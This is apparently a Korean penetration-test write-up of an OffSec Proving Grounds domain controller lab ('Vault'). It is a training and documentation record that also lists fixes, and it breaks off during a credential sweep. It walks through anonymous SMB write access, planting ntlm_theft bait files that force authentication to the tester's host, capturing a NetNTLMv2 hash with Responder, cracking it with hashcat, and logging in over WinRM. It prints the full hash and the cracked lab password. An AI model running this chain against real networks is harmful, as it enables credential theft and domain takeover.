---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/solved
  - tech/svc/smb
  - tech/ad/ntlm-relay
  - tech/cred/crack
  - tech/ad/bloodhound
  - tech/ad/gpo-abuse
  - tech/ad/acl-abuse
  - tech/exec/winrm
  - tech/exec/rdp
  - tech/win/serestore
type: machine
platform: pg
os: windows
ip: 192.168.120.172
domain: vault.offsec
ports: [53, 88, 123, 135, 139, 389, 445, 464, 593, 636, 3268, 3389, 5985, 9389]
services: [domain, http, kerberos-sec, kpasswd5, ldap, mc-nmf, microsoft-ds, ms-wbt-server, msrpc, ncacn_http, netbios-ssn, ntp]
status: solved
manual_tags: true
manual_cves: true
tech_count: 9
---

> [!info] 요약
> 타겟 `192.168.120.172` · Windows Server 2019 Standard(build 17763, `DC.vault.offsec`) · Advanced · 플래그 2개
> 진입점: 익명 쓰기 가능한 `DocumentsShare` 에 `ntlm_theft` 미끼 24개 투하 → 폴더를 연 `VAULT\anirudh` 의 NetNTLMv2 캡처 → hashcat `-m 5600` 크랙(`SecureHM`) → WinRM 셸
> 권한상승: BloodHound 에서 `anirudh → GenericWrite on Default Domain Policy(GPO)` 확인 → SharpGPOAbuse `--AddlocalAdmin` → `gpupdate /force` → 재로그온 → Administrator. `SeRestorePrivilege` 를 쓴 utilman 치환 경로도 실제로 완주해 SYSTEM 획득
> 시행착오·교훈 → [[_PLAYBOOK]]

> [!warning] 이 노트를 읽는 규약 — 실측과 재구성을 구분할 것
> - **실측 출처** — Kali 산출물 `~/PG/Vault/`(`nmap.log` · `udp.txt` · `hash.txt` · `test.txt` · BloodHound JSON 7종) · `~/.zsh_history` · hashcat potfile · 볼트 `파일보관\` 스크린샷 17장.
> - **BloodHound JSON 은 `jq` 로 직접 열어 대조함** — 이 노트의 ACL 서술은 그래프 스크린샷이 아니라 원본 JSON 이 1차 근거임.
> - **미실행** — `SeBackupPrivilege` → `ntds.dit` 경로(`Privilege Escalation` 절의 경로 C)는 **끝까지 실행하지 않았음.** 절차 형태만 코드펜스 밖 산문과 `[가정]` 표시로 남김.
> - **완주 확인** — `SeRestorePrivilege` → utilman 치환 → RDP 경로(경로 B)는 **끝까지 실행됨.** 근거는 `파일보관\Pasted image 20260708134045.png` — RDP 세션의 `whoami` = `nt authority\system` 과 `proof.txt` 읽기가 한 화면에 있음.
> - **타임스탬프 주의** — 스크린샷 파일명은 **붙여넣기 시각**이지 캡처 시각이 아님. 실제로 이 박스에서 `…103537.png`(mput)가 `…103551.png`(미끼 생성)보다 **먼저** 붙여넣어져 순서가 역전돼 있음.

## Target #1 – 192.168.120.172

### Initial Access – 익명 쓰기 가능한 SMB 공유에 강제 인증 미끼를 심어 도메인 사용자의 NetNTLMv2 를 받아내고 오프라인 크랙

**Vulnerability Explanation:** 비표준 공유 `DocumentsShare` 가 인증 없이(null 세션) **읽기+쓰기**로 열려 있음.
- Windows 탐색기·인덱서·미리보기 핸들러는 폴더를 렌더할 때 그 안의 `desktop.ini`·`.scf`·`.url`·`.library-ms` 가 가리키는 **UNC 경로를 자동으로 페치**함
- 페치 대상이 공격자 SMB 서버면 그 과정에서 사용자의 **NetNTLMv2 인증이 그대로 전송**됨 — 사용자가 파일을 열 필요조차 없음
- 이 계정(`VAULT\anirudh`)의 비밀번호가 rockyou 에 존재해 오프라인 크랙으로 평문 회수

**Vulnerability Fix:**
- 공유 ACL 에서 `ANONYMOUS LOGON`·`Everyone` 쓰기 제거. 공유 권한과 NTFS 권한 양쪽을 최소 권한으로 재설정
- GPO **Restrict NTLM: Outgoing NTLM traffic = Deny all**(예외는 명시 목록)로 임의 SMB 서버로의 NTLM 유출 차단
- 신뢰되지 않은 공유의 탐색기 미리보기·인덱싱 비활성
- 비밀번호 정책 강화 + 유출 사전 차단 — 강제 인증을 당해도 크랙되지 않으면 진입 실패임

**Severity:** Critical — 무인증 원격 접근만으로 도메인 사용자 자격증명을 획득하고 그대로 WinRM 대화형 셸까지 연결됨

**Steps to reproduce the attack:**
1. `smbclient -L <타겟> -N` 으로 익명 공유 목록 확보 → 비표준 공유 `DocumentsShare` 식별
2. `smbmap -H <타겟> -u anonymous` 로 해당 공유가 `READ, WRITE` 임을 확인
3. `ntlm_theft.py -g all -s <KALI-IP> -f steal` 로 미끼 24종 생성
4. `sudo responder -I tun0` 기동
5. `smbclient //<타겟>/DocumentsShare -N -c 'prompt OFF; mput *'` 로 미끼 전량 투하
6. Responder 에 들어온 `anirudh::VAULT:…` NetNTLMv2 한 줄을 그대로 파일로 저장
7. `hashcat -m 5600 hash.txt rockyou.txt` 로 크랙 → `SecureHM`
8. `evil-winrm -i <타겟> -u anirudh -p SecureHM` 으로 대화형 셸 획득

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.120.172 | TCP: 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3389, 5985, 9389, 49666, 49668, 49673, 49674, 49679, 49703 · UDP: 53, 88, 123 |

`nnmap` 은 별칭임(`~/.zshrc:247` — `nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log`). ⚠️ `-oN nmap.log` 가 박혀 있어 **작업 디렉터리를 먼저 옮기지 않으면 이전 박스 로그를 덮어씀.**

```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ nnmap 192.168.120.172
```

```text
# Nmap 7.98 scan initiated Wed Jul  8 09:15:26 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.120.172
Nmap scan report for 192.168.120.172
Host is up (0.085s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-08 00:15:59Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec, Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.vault.offsec
| Not valid before: 2026-07-07T00:13:45
|_Not valid after:  2027-01-06T00:13:45
|_ssl-date: 2026-07-08T00:17:35+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: VAULT
|   NetBIOS_Domain_Name: VAULT
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: vault.offsec
|   DNS_Computer_Name: DC.vault.offsec
|   DNS_Tree_Name: vault.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2026-07-08T00:16:55+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-08T00:16:56
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   84.36 ms 192.168.45.1
2   84.22 ms 192.168.45.254
3   84.67 ms 192.168.251.1
4   85.10 ms 192.168.120.172

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul  8 09:17:38 2026 -- 1 IP address (1 host up) scanned in 131.55 seconds
```
— 출처: `~/PG/Vault/nmap.log` (TCP `-p-` 전문, 3052바이트)

UDP 는 별도 스캔이고 별도 파일임. 두 출력을 섞지 말 것 — 위는 TCP, 아래는 UDP 다.

```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ sudo nmap -sU --top-ports 100 192.168.120.172 -oN udp.txt
```

```text
# Nmap 7.98 scan initiated Wed Jul  8 10:15:26 2026 as: /usr/lib/nmap/nmap -sU --top-ports 100 -oN udp.txt 192.168.120.172
Nmap scan report for 192.168.120.172
Host is up (0.085s latency).
Not shown: 97 open|filtered udp ports (no-response)
PORT    STATE SERVICE
53/udp  open  domain
88/udp  open  kerberos-sec
123/udp open  ntp

# Nmap done at Wed Jul  8 10:15:30 2026 -- 1 IP address (1 host up) scanned in 3.39 seconds
```
— 출처: `~/PG/Vault/udp.txt` (UDP top-100 전문, 422바이트)

**버전 판정 — 독립 근거 2개**

| 근거 | 값 | 출처 |
|---|---|---|
| RDP NTLM 정보(`rdp-ntlm-info`) | `Product_Version: 10.0.17763` · `DNS_Computer_Name: DC.vault.offsec` | `~/PG/Vault/nmap.log` |
| 인증 후 nxc SMB 배너 | `Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:vault.offsec)` | `파일보관\Pasted image 20260708104729.png` |

빌드 17763 = Windows Server 2019. 두 근거가 스캐너의 OS 추측(`Aggressive OS guesses`)과 **별개로** 일치함 — 자동 판정을 단독 근거로 쓰지 않는다는 규율의 실행임.

**포트 지문 읽기 — 웹이 없는 DC**

53·88·135·139·389·445·464·593·636·3268·3389·5985·9389 은 도메인 컨트롤러의 표준 세트임. **80·443·8080 이 하나도 없음** — 웹 진입점이 통째로 없다는 뜻이라 남는 공격면이 셋으로 좁혀짐.

1. **SMB(445)** — 익명/게스트 공유, null 세션 열거 ← 이 박스의 정답
2. **LDAP(389)** — 익명 바인드로 사용자·`description` 필드에서 비밀번호 줍기
3. **Kerberos(88)** — 사용자명만 알면 AS-REP 로스팅

`123/udp ntp` 는 DC 가 도메인의 시간 서버라는 뜻임. `ssl-date` 가 `0s from scanner time` 이라 이 박스에서는 시계 문제가 없었고 시각 동기 질의도 필요하지 않았음. `KRB_AP_ERR_SKEW` 를 만났을 때의 대처는 [[_PLAYBOOK#A-51. AD 박스에서 막히면 «취약점»이 아니라 넷을 먼저 본다]].

`smb2-security-mode` 가 **`Message signing enabled and required`** — 이 한 줄이 뒤의 「릴레이냐 크랙이냐」 판정을 결정함.

**SMB 공유 열거**

```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ smbclient -L 192.168.120.172 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DocumentsShare  Disk
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.120.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

![[Pasted image 20260708103721.png]]

`-N` 은 "no password"(null 세션)임 — 익명으로 목록이 나왔음. 표준 공유(`ADMIN$`·`C$`·`IPC$`·`NETLOGON`·`SYSVOL`) 사이에 **비표준 공유 `DocumentsShare`** 하나가 섞여 있고, 이것이 이 박스가 심어둔 진입점임.

하단 SMB1 오류는 정상임. smbclient 가 워크그룹 이름을 얻으려고 레거시 SMB1 로 **한 번 더** 붙어보다 실패한 것이고, **공유 목록은 이미 그 위에서 SMB2/3 로 받았음.** 이 줄을 보고 「SMB 가 막혔다」로 읽지 말 것 — 에러 줄 위에 이미 성공한 출력이 있는지부터 볼 것.

**쓰기 가능 여부 — 도구 판정과 실제 업로드를 둘 다 함**

```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ smbmap -H 192.168.120.172 -u anonymous
[+] IP: 192.168.120.172:445     Name: 192.168.120.172           Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        DocumentsShare                                          READ, WRITE
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share
        SYSVOL                                                  NO ACCESS       Logon server share
```

`DocumentsShare  READ, WRITE` — 이 한 줄이 전체 공격을 여는 열쇠임.

다만 **도구가 찍은 권한과 실제 동작이 어긋날 수 있음**(공유 권한은 WRITE 인데 NTFS 권한이 READ 인 구성). 그래서 5바이트 파일을 실제로 올려 확정함:

```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ smbclient //192.168.120.172/DocumentsShare -U ''
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Nov 19 17:59:02 2021
  ..                                  D        0  Fri Nov 19 17:59:02 2021

                7706623 blocks of size 4096. 712639 blocks available
smb: \> put test.txt
putting file test.txt as \test.txt (0.0 kB/s) (average 0.0 kB/s)
smb: \> ls
  .                                   D        0  Wed Jul  8 10:38:11 2026
  ..                                  D        0  Wed Jul  8 10:38:11 2026
  test.txt                            A        5  Wed Jul  8 10:38:11 2026

                7706623 blocks of size 4096. 712624 blocks available
```

![[Pasted image 20260708103849.png]]

`put test.txt` 성공 — 쓰기 가능 확정. 검증 파일 실체는 `~/PG/Vault/test.txt`(5바이트, 내용 `test`)임.

폴더가 **비어 있다**는 것도 신호임. 읽을 데이터가 없는 쓰기 공유는 「여기에 뭔가 넣어라」는 설계 의도를 드러냄 — 정상 문서 공유라면 문서가 있어야 함. **비어 있고 + 쓰기 가능 = 미끼용 공유**로 읽을 것.

> [!warning] 이 `ls` 는 미끼 투하 «뒤»에 찍힌 것인데 미끼가 하나도 안 보임
> 산출물 mtime 이 순서를 이렇게 못박음 — 미끼 생성 `~/git/ntlm_theft/steal` **10:22:16** → 해시 회수 `hash.txt` **10:28:29** → `test.txt` 업로드 **10:38:11**(위 출력의 서버측 타임스탬프).
> 그런데 위 세션의 첫 `ls` 는 디렉터리 mtime 을 `Fri Nov 19 17:59:02 2021` 로 보여줌 — **2026년에 한 번도 써진 적이 없는 상태**이고, `put` 뒤의 `ls` 에도 `test.txt` 한 개뿐임.
> **관측은 「10:38 시점에 공유가 비어 있었다」까지가 확정임.** 랩의 시뮬레이션·정리 잡이 폴더를 비웠거나 인스턴스가 그 사이에 초기화됐거나 둘 중 하나이겠으나 **어느 쪽인지 확정할 근거가 이 박스의 산출물에 없음** `[가정]`.
> 실용적 함의는 하나임 — **미끼 공유는 비워질 수 있으므로 해시가 안 들어오면 재투하부터 할 것.**

### Initial Access – 쓰기 공유 미끼 → NetNTLMv2 크랙

**왜 릴레이가 아니라 크랙인가**

`nmap.log` 가 `Message signing enabled and required` 를 찍었고, 이 랩은 DC 한 대짜리 단일 호스트임(`20260708124927_computers.json` 에 `DC.VAULT.OFFSEC` 하나). **릴레이할 두 번째 서버가 존재하지 않음** → 크랙만 남음.

시험의 AD 세트(DC 1 + 멤버 2~3)에서는 이 판단이 갈림 — 멤버 서버의 서명이 꺼져 있으면 DC 의 인증을 그 멤버로 릴레이해 로컬 관리자를 얻는 쪽이 훨씬 강함. 컴퓨터 계정처럼 **크랙이 불가능한 인증도 릴레이는 그대로 씀.**

**미끼 파일 생성**

```bash
┌──(kali㉿kali)-[~/git/ntlm_theft]
└─$ python ntlm_theft.py -g all -s 192.168.45.175 -f steal
/home/kali/git/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
Created: steal/steal.scf (BROWSE TO FOLDER)
Created: steal/steal-(url).url (BROWSE TO FOLDER)
Created: steal/steal-(icon).url (BROWSE TO FOLDER)
Created: steal/steal.lnk (BROWSE TO FOLDER)
Created: steal/steal.rtf (OPEN)
Created: steal/steal-(stylesheet).xml (OPEN)
Created: steal/steal-(fulldocx).xml (OPEN)
Created: steal/steal.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: steal/steal-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: steal/steal-(includepicture).docx (OPEN)
Created: steal/steal-(remotetemplate).docx (OPEN)
Created: steal/steal-(frameset).docx (OPEN)
Created: steal/steal-(externalcell).xlsx (OPEN)
Created: steal/steal.wax (OPEN)
Created: steal/steal.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: steal/steal.asx (OPEN)
Created: steal/steal.jnlp (OPEN)
Created: steal/steal.application (DOWNLOAD AND OPEN)
Created: steal/steal.pdf (OPEN AND ALLOW)
Created: steal/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: steal/steal.library-ms (BROWSE TO FOLDER)
Created: steal/Autorun.inf (BROWSE TO FOLDER)
Created: steal/desktop.ini (BROWSE TO FOLDER)
Created: steal/steal.theme (THEME TO INSTALL
Generation Complete.
```

![[Pasted image 20260708103551.png]]

⚠️ 스크린샷은 화면이 잘려 `steal.pdf` 줄까지만 보임. 그 아래 5줄(`zoom-attack-instructions.txt` ~ `Generation Complete.`)은 **원본 노트가 기록해 둔 것**이고, 뒤의 `mput` 출력이 같은 파일들을 다시 증언함.

`-g all` 로 나온 것은 정확히 **24개**임(`Created:` 24줄 = 뒤의 `putting file` 24줄).

| 플래그 | 역할 | 빼면 |
|---|---|---|
| `-g all` | 24종 전부 생성 | 특정 종류만 만들면 발동하지 않는 미끼에 걸려 헛수고 |
| `-s 192.168.45.175` | 미끼가 가리킬 UNC 서버 = 내 Kali | **Responder 의 바인딩 IP 와 달라지면 인증이 아무 데도 안 옴.** VPN 재연결이 1순위 원인 |
| `-f steal` | 출력 폴더 | |

`-s` 는 **IP 로** 넣을 것. 미끼 안의 UNC 가 `\\<-s값>\…` 이 되는데 호스트명을 넣으면 타겟이 그 이름을 해석해야 하고, 타겟 DNS 에 내 Kali 는 없음. IP 면 이름 해석 단계가 통째로 생략됨. (반대로 LLMNR/NBT-NS 포이즈닝을 노린다면 **존재하지 않는 호스트명**을 넣어 Responder 가 그 이름을 가로채게 하는 전술도 있음 — 이 박스에서는 시도하지 않았음.)

**미끼가 무엇을 언제 발동시키는가**

| 발동 조건 | 미끼 파일 | 메커니즘 |
|---|---|---|
| **폴더를 여는 것만으로** | `desktop.ini` · `steal.scf` · `steal-(icon).url` · `steal-(url).url` · `steal.lnk` · `steal.library-ms` · `Autorun.inf` | 탐색기가 폴더·파일 아이콘을 그리려고 UNC 를 자동 확인 |
| **문서를 열면** | `steal-(includepicture).docx` · `steal-(remotetemplate).docx` · `steal-(frameset).docx` · `steal-(fulldocx).xml` · `steal-(stylesheet).xml` · `steal-(externalcell).xlsx` · `steal.rtf` | Office 가 원격 이미지·템플릿·스타일시트를 페치 |
| **브라우저·핸들러로 열면** | `steal.htm` · `steal-(handler).htm` · `steal.m3u` · `steal.asx` · `steal.wax` · `steal.jnlp` · `steal.application` · `steal.pdf` · `steal.theme` | 각 핸들러가 원격 리소스를 참조 |
| **사람에게 붙여넣게 하면** | `zoom-attack-instructions.txt` | 채팅에 붙이면 상대 클라이언트가 UNC 를 링크로 렌더 |

`.scf`(Shell Command File)는 `IconFile=\\<KALI>\share\icon.ico` 필드를 담아 탐색기의 아이콘 렌더 시점에 발동하고, `desktop.ini` 는 폴더 자체의 아이콘·툴팁을 정의하는 시스템 파일이라 폴더 진입 시 무조건 읽힘. 그래서 이 둘이 가장 넓게 통함. **어느 것이 통할지 모르므로 `-g all` 로 전부 뿌리는 것이 정석임.**

**Responder 기동**

```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ sudo responder -I tun0
```

![[Pasted image 20260708103424.png]]

배너에서 확인할 것은 둘임 — Poisoners(`LLMNR`·`NBT-NS`·`MDNS`·`DNS` 가 `[ON]`, `DHCP` 는 `[OFF]`)와 **SMB 서버가 켜져 있는가**. 미끼가 SMB 로 오므로 SMB 서버가 꺼져 있으면 인증을 받아도 해시를 못 뽑음.

⚠️ `-I` 는 **인터페이스 이름**을 받음. IP 를 넣으면 안 됨.

**미끼 투하**

```bash
┌──(kali㉿kali)-[~/git/ntlm_theft/steal]
└─$ smbclient //192.168.120.172/DocumentsShare -N -c 'prompt OFF; mput *'
putting file steal.application as \steal.application (6.3 kB/s) (average 6.3 kB/s)
putting file steal-(stylesheet).xml as \steal-(stylesheet).xml (0.6 kB/s) (average 3.5 kB/s)
putting file steal-(fulldocx).xml as \steal-(fulldocx).xml (166.0 kB/s) (average 77.7 kB/s)
putting file steal.theme as \steal.theme (6.6 kB/s) (average 62.5 kB/s)
putting file steal.lnk as \steal.lnk (8.4 kB/s) (average 53.0 kB/s)
putting file steal-(frameset).docx as \steal-(frameset).docx (38.6 kB/s) (average 50.8 kB/s)
putting file desktop.ini as \desktop.ini (0.2 kB/s) (average 44.3 kB/s)
putting file zoom-attack-instructions.txt as \zoom-attack-instructions.txt (0.4 kB/s) (average 39.1 kB/s)
putting file steal.pdf as \steal.pdf (3.0 kB/s) (average 35.4 kB/s)
putting file steal-(url).url as \steal-(url).url (0.2 kB/s) (average 31.8 kB/s)
putting file steal.rtf as \steal.rtf (0.4 kB/s) (average 29.1 kB/s)
putting file steal.library-ms as \steal.library-ms (4.7 kB/s) (average 27.2 kB/s)
putting file steal.htm as \steal.htm (0.3 kB/s) (average 25.3 kB/s)
putting file steal-(remotetemplate).docx as \steal-(remotetemplate).docx (98.0 kB/s) (average 30.3 kB/s)
putting file steal.scf as \steal.scf (0.3 kB/s) (average 28.4 kB/s)
putting file steal-(icon).url as \steal-(icon).url (0.4 kB/s) (average 26.7 kB/s)
putting file steal.asx as \steal.asx (0.6 kB/s) (average 25.2 kB/s)
putting file steal-(handler).htm as \steal-(handler).htm (0.4 kB/s) (average 23.9 kB/s)
putting file steal.jnlp as \steal.jnlp (0.8 kB/s) (average 22.8 kB/s)
putting file steal-(includepicture).docx as \steal-(includepicture).docx (37.9 kB/s) (average 23.5 kB/s)
putting file Autorun.inf as \Autorun.inf (0.3 kB/s) (average 22.5 kB/s)
putting file steal.m3u as \steal.m3u (0.2 kB/s) (average 21.5 kB/s)
putting file steal-(externalcell).xlsx as \steal-(externalcell).xlsx (22.5 kB/s) (average 21.5 kB/s)
putting file steal.wax as \steal.wax (0.2 kB/s) (average 20.7 kB/s)
```

![[Pasted image 20260708103537.png]]

| 조각 | 역할 | 빼면 |
|---|---|---|
| `-N` | null 세션 | 익명 쓰기가 되는 공유라 자격증명이 필요 없음 |
| `-c '…'` | 비대화식 명령 실행 | smbclient 가 대화형 프롬프트로 들어가 스크립트화가 안 됨 |
| `prompt OFF` | 파일마다 y/n 확인을 끔 | 켜져 있으면 `mput` 이 24번 확인을 물어 자동화가 멈춤 |
| `mput *` | 현재 폴더 전량 업로드 | |

**전송 성공 메시지를 믿지 말고 `ls` 로 셀 것.** 업로드가 중간에 끊기거나 특수문자 파일명(`steal-(url).url` 의 괄호)에서 실패했을 때, 하필 가장 강력한 `desktop.ini`·`.scf` 가 빠지면 발동 확률이 통째로 떨어짐.

```bash
smbclient //192.168.120.172/DocumentsShare -N -c 'ls'
```

**캡처**

폴더를 여는 무언가가 미끼를 건드리자 해시가 들어왔음:

```text
[SMB] NTLMv2-SSP Client   : 192.168.120.172
[SMB] NTLMv2-SSP Username : VAULT\anirudh
[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:66134a3a082ecb7b:751AA3935EA2F39C8A6C49162F7C6AB5:010100000000000080A4BEC5C30EDD0145715E4350EED7450000000002000800540033005100580001001E00570049004E002D0058005800360043005A00490052004D0032005800380004003400570049004E002D0058005800360043005A00490052004D003200580038002E0054003300510058002E004C004F00430041004C000300140054003300510058002E004C004F00430041004C000500140054003300510058002E004C004F00430041004C000700080080A4BEC5C30EDD01060004000200000008003000300000000000000001000000002000001830F0C706803F0173332094F5B2BB5FB0C4DAD79922348512363CC7DC51C8100A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100370035000000000000000000
```
— 출처: `파일보관\Pasted image 20260708103353.png` · 같은 값이 `~/PG/Vault/hash.txt`(706바이트)로 저장돼 있음

![[Pasted image 20260708103353.png]]

`NTLMv2-SSP Client : 192.168.120.172` — 소스가 타겟 IP 임. `[SMB]` 태그가 트리거를 증언함.

**캡처 blob 이 진입 벡터를 스스로 증명한다**

blob 안의 `MsvAvTargetName` 을 직접 디코드함:

```bash
python3 - <<'EOF'
import binascii,struct
p=open('hash.txt').read().strip().split(':')
print('user=',p[0],'domain=',p[2])
b=binascii.unhexlify(p[5]); i=28
while i+4<=len(b):
    aid,alen=struct.unpack('<HH',b[i:i+4]); i+=4
    v=b[i:i+alen]; i+=alen
    if aid==0: break
    if aid==9: print('MsvAvTargetName =',v.decode('utf-16le'))
EOF
user= anirudh domain= VAULT
MsvAvTargetName = cifs/192.168.45.175
```
— 입력: `~/PG/Vault/hash.txt` · 위 디코드는 노트 작성 시점의 재분석임

`cifs/192.168.45.175` — 인증이 **SMB(CIFS)** 로 왔음. 같은 자리가 `HTTP/…` 였다면 웹 페치가 트리거였다는 뜻임([[Heist]]가 그 사례). **한 필드로 진입 벡터가 갈림.**

같은 blob 의 다른 AV_PAIR 는 `NbComputerName = WIN-XX6CZIRM2X8` · `DnsComputerName = WIN-XX6CZIRM2X8.T3QX.LOCAL` · `NbDomainName = T3QX` 임. 이것들은 타겟의 이름이 아니라 **Responder 가 무작위로 만든 가짜 서버 신원**임 — Responder 는 자신을 임의 이름의 SMB 서버로 위장해 클라이언트가 인증하게 유도함.

> [!warning] blob 안의 도메인 이름(`T3QX.LOCAL`)을 타겟 도메인으로 착각하지 말 것
> hashcat 이 쓰는 도메인은 **콜론으로 구분된 3번째 필드(`VAULT`)** 임. 해시를 편집하지 말고 한 줄을 통째로 넣으면 이 구분을 신경 쓸 필요가 없음 — hashcat 이 알아서 파싱함.

**blob 필드 해부**

| 필드 | 이 박스의 값 | 정체 |
|---|---|---|
| `anirudh` | 사용자명 | 크랙 후 그대로 쓸 계정 |
| (빈칸) | LM 필드 | NTLMv2 에서는 항상 비어 있음 |
| `VAULT` | 도메인(NetBIOS) | **HMAC 입력** — 형태가 바뀌면 크랙 실패 |
| `66134a3a082ecb7b` | 서버 챌린지 | Responder 가 만든 8바이트 |
| `751AA3935EA2F39C8A6C49162F7C6AB5` | NTProofStr | HMAC-MD5(NTLMv2Hash, 챌린지‖blob). 크랙이 맞춰야 할 값 |
| `010100…` | blob | 타임스탬프 + 클라이언트 챌린지 + AV_PAIR 목록 |

크랙 알고리즘 — 후보 비밀번호 `p` 에 대해 `NTHash = MD4(UTF16LE(p))` → `NTLMv2Hash = HMAC-MD5(NTHash, UTF16LE("ANIRUDH"+"VAULT"))` → `HMAC-MD5(NTLMv2Hash, 챌린지‖blob)` 가 `NTProofStr` 과 같으면 정답.

> [!danger] 해시를 한 글자도 편집하지 말 것
> 사용자명·도메인·blob 이 **전부 HMAC 입력**임. 도메인을 FQDN(`vault.offsec`)으로 바꿔 적거나 줄바꿈이 끼면 **정답 비밀번호를 넣어도 실패함.** Responder 출력의 `[SMB] NTLMv2-SSP Hash :` 뒤 한 줄 전체를 그대로 파일에 넣을 것.

**크랙**

hashcat 모드는 Kali 에서 직접 확인함:

```bash
hashcat -hh | grep -E "^\s+(5600|13100|18200)\s"
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
   5600 | NetNTLMv2                                                  | Network Protocol
```

Responder·강제 인증 결과는 **`-m 5600`** 임(AS-REP 은 `-m 18200`, Kerberoast TGS-REP 은 `-m 13100`).

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

potfile 이 결과를 보존하고 있음:

```bash
grep -i '^ANIRUDH' ~/.local/share/hashcat/hashcat.potfile | rev | cut -d: -f1 | rev
SecureHM
```
— 출처: `~/.local/share/hashcat/hashcat.potfile`

**획득: `vault.offsec\anirudh : SecureHM`.**

⚠️ `~/.zsh_history` 에 남은 `hashcat -m 5600 hash.txt …` 한 줄은 **위치상 [[Heist]] 블록**(`mkdir Heist` · `cd Heist` · `nnmap 192.168.120.165` 바로 뒤)에 있음. `~/.zshrc` 의 `hist_ignore_dups` + `hist_expire_dups_first` + `HISTSIZE=1000` 때문에 **문자열이 같은 명령의 중복 벌이 만료된 것**임 `[가정]`. 그러나 potfile 에 `ANIRUDH::VAULT:…` 항목이 있으므로 **이 박스에서도 실행됐음은 확정**임 — 히스토리 부재를 미실행의 증거로 쓰지 말 것.

NetNTLMv2 는 **반복(iteration)이 없는 HMAC-MD5 2회**라 bcrypt·PBKDF2 같은 stretching 이 없음. CPU 단독으로도 rockyou 전체가 수십 초에 끝남. **판정: rockyou 를 완주해도 안 깨지면 규칙(`-r best64.rule`)을 붙이거나 다른 경로로 갈 것.** 여기서 오래 붙잡는 것이 시험 시간 낭비 1위임.

**자격증명 하나 → 전 프로토콜 스윕**

```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ nxc-sweep 192.168.120.172 -u 'anirudh' -p 'SecureHM'
[*] Starting NXC sweep for 192.168.120.172 as anirudh ...

[+] Port 445 open. Checking smb ...
